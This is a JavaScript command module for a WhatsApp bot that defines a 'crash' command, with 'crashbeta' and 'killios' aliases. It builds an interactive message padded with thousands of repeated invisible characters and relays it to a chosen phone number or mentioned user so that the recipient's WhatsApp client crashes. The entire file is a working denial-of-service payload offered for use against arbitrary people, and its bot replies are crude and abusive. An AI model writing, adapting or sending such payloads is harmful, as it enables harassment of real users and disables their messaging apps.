const crypto = require('crypto');

module.exports = {
  name: 'crash',
  aliases: ['crashbeta', 'killios'],
  description: 'Sends a payload to crash a WhatsApp client',
  run: async (context) => {
    const { client, m, prefix, text, botname } = context;

    try {
      // Check for target (phone number, quoted user, or mentioned JID)
      let target = text.split(' ')[0] || m.quoted?.sender || m.mentionedJid?.[0];
      if (!target) {
        return client.sendMessage(m.chat, {
          text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, dumbass, give me a target! Use ${prefix}crash <number> or mention someone, moron.\n\nPowered by *${botname}*`
        }, { quoted: m });
      }
      // Convert to JID format if needed (e.g., 123456789 → 123456789@s.whatsapp.net)
      if (!target.includes('@s.whatsapp.net')) {
        target = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
      }

      // Overload function
      async function Overload(target) {
        const junk = "ឿ".repeat(5000); // Invisible characters

        const payload = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                body: { text: junk + "XP - STORM🩸" + junk },
                footer: { buttonParamsJson: junk },
                header: {
                  subtitle: junk,
                  buttonParamsJson: junk,
                  hasMediaAttachment: false,
                },
                contextInfo: {
                  isForwarded: true,
                  forwardingScore: 999999,
                  mentionedJid: [target],
                  quotedMessage: {
                    buttonsMessage: {
                      contentText: junk,
                      footerText: junk,
                      buttons: Array(5).fill({
                        buttonId: junk,
                        buttonText: { displayText: junk },
                        type: 1,
                      }),
                      headerType: 1,
                    },
                  },
                  conversionSource: "🔥",
                  conversionData: crypto.randomBytes(16),
                  utm: {
                    utmSource: junk,
                    utmCampaign: junk,
                  },
                },
              },
            },
          },
        };

        // Create message with payload
        const msg = context.generateWAMessageFromContent(target, context.proto.Message.fromObject(payload), { userJid: target });

        // Send message
        await client.relayMessage(target, msg.message, {
          messageId: msg.key.id,
        });
        console.log(`[IMMEDIATE FC] Sent to ${target}`);
      }

      // Execute Overload
      await Overload(target);

      // Tailored response based on command
      const command = m.text.toLowerCase().split(' ')[0];
      let response;
      if (command === '.crash') {
        response = `💥 Payload dropped on ${target}! Shit’s about to hit the fan, bitches!\n\nPowered by *${botname}*`;
      } else if (command === '.crashbeta') {
        response = `🧪 Beta payload blasted to ${target}! Testing some next-level chaos!\n\nPowered by *${botname}*`;
      } else if (command === '.killios') {
        response = `🍎 iOS smoked at ${target}! Say goodbye to that apple, fucker!\n\nPowered by *${botname}*`;
      }

      // Send response
      await client.sendMessage(m.chat, { text: `◈━━━━━━━━━━━━━━━━◈\n│❒ ${response}` }, { quoted: m });

    } catch (error) {
      console.error('Error sending crash payload:', error);
      await client.sendMessage(m.chat, {
        text: `◈━━━━━━━━━━━━━━━━◈\n│❒ Yo, something fucked up the crash payload. Try again, you slacker.\n\nPowered by *${botname}*`
      }, { quoted: m });
    }
  },
};